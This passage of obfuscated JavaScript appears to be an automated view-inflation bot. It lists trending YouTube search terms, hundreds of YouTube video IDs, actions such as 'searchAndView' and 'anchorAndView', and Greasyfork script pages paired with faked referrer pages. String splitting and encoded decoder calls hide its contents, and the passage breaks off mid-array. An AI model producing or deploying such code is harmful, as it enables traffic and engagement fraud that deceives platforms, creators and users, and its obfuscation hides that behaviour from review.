searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + Z(0x3) + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + Z(0xd) + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0xee7 + -0x665 * 0x6 + 0x11c5 * 0x3)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2166 + -0x8 * 0x373 + -0x2e2 * 0x2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + Z(0x11) + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x10 * 0x148 + 0x16 * 0x57 + 0xd09);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    Z(0x9) + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    a0(0xe) + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x18) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a1(0x16, '4QIt') + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
